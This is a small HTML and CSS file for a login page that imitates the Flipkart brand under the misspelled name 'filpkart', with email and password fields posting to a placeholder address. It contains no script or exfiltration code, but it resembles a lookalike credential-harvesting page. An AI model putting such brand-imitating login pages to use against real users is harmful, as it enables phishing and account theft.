<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>filpkart login</title>
        <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f2f2f2;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .sign-in-container {
            background-color: white;
            padding: 20px;
            border-radius: 5px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
        }
        h2 {
            margin-bottom: 20px;
        }
        input[type="email"], input[type="password"] {
            width: 100%;
            padding: 10px;
            margin: 10px 0;
            border: 1px solid #ccc;
            border-radius: 4px;
        }
        button {
            width: 100%;
            padding: 10px;
            background-color: #f90;
            border: none;
            color: white;
            font-size: 16px;
            border-radius: 4px;
            cursor: pointer;
        }
        button:hover {
            background-color: #e68a00;
        }
    </style>
</head>
<body>

<div class="sign-in-container"><center>
    <img src="img6.jpg" alt="filpkart Logo"></center>
    <h2>login</h2>
    <form action="/submit-your-form" method="post">
        <input type="email" name="email" placeholder="Email or mobile phone number" required>
        <input type="password" name="password" placeholder="Password" required>
        <button type="submit">Continue</button>
    </form>
    <p><a href="#">Forgot your password?</a></p>
</div>

</body>
</html>
